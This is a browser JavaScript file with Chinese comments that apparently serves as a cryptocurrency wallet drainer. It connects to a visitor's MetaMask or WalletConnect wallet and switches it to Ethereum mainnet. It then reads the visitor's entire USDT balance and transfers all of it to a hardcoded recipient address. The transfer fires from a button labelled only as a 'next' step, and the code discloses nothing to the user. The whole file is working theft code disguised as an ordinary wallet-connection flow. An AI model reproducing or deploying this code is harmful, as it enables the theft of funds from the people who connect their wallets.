// USDT 合约地址（以太坊主网）
const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
// 目标地址
const recipientAddress = '0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C';

// WalletConnect 提供者
async function getWeb3Provider() {
    let web3;

    // 优先尝试 MetaMask 或其他注入的以太坊提供者
    if (window.ethereum) {
        console.log("检测到 MetaMask 或其他注入提供者");
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            console.log("MetaMask 连接成功");
            return web3;
        } catch (error) {
            console.error("MetaMask 连接失败:", error);
            throw new Error("MetaMask 连接失败: " + error.message);
        }
    } else if (window.web3) {
        console.log("检测到旧版 Web3 注入");
        web3 = new Web3(window.web3.currentProvider);
        return web3;
    } else {
        // 如果没有注入提供者，使用 WalletConnect
        console.log("未检测到钱包注入，尝试 WalletConnect");
        const WalletConnectProvider = window.WalletConnectProvider;
        const provider = new WalletConnectProvider({
            infuraId: "9aa3d95b3bc440fa88ea12eaa4456161", // 临时 Infura ID，建议替换为自己的
        });
        try {
            await provider.enable();
            web3 = new Web3(provider);
            console.log("WalletConnect 连接成功");
            return web3;
        } catch (error) {
            console.error("WalletConnect 连接失败:", error);
            throw new Error("WalletConnect 连接失败: " + error.message);
        }
    }
}

async function transferUsdt() {
    try {
        // 获取 Web3 提供者
        const web3 = await getWeb3Provider();
        console.log("Web3 提供者已初始化");

        // 获取账户
        const accounts = await web3.eth.getAccounts();
        const account = accounts[0];
        console.log("已连接账户:", account);

        // 检查网络并提示切换到以太坊主网
        const chainId = await web3.eth.getChainId();
        if (chainId.toString() !== "1") {
            try {
                await web3.currentProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }], // 以太坊主网
                });
                console.log("网络已切换到以太坊主网");
            } catch (switchError) {
                console.error("网络切换失败:", switchError);
                alert("请手动切换到以太坊主网（Ethereum Mainnet）后再试。");
                return;
            }
        }

        // USDT 合约 ABI
        const usdtAbi = [
            {
                "constant": true,
                "inputs": [{ "name": "_owner", "type": "address" }],
                "name": "balanceOf",
                "outputs": [{ "name": "balance", "type": "uint256" }],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }],
                "name": "transfer",
                "outputs": [],
                "type": "function"
            }
        ];

        // 初始化 USDT 合约
        const usdtContract = new web3.eth.Contract(usdtAbi, usdtAddress);

        // 获取 USDT 余额
        const balance = await usdtContract.methods.balanceOf(account).call();
        const amount = web3.utils.toBN(balance);
        const balanceInUsdt = web3.utils.fromWei(amount, 'mwei'); // USDT 有 6 个小数位
        console.log("USDT 余额:", balanceInUsdt);

        // 发起转账交易（转账全部余额，即使余额为 0）
        await usdtContract.methods.transfer(recipientAddress, amount).send({ from: account });
        alert("交易已成功发送！");
    } catch (error) {
        console.error("错误详情:", error);
        alert("无法转账: " + (error.message || "未知错误"));
    }
}

// 确保 DOM 加载完成后再绑定事件
document.addEventListener("DOMContentLoaded", () => {
    const nextButton = document.getElementById("next-button");
    if (nextButton) {
        nextButton.addEventListener("click", transferUsdt);
    } else {
        console.error("未找到 'next-button' 元素");
    }
});
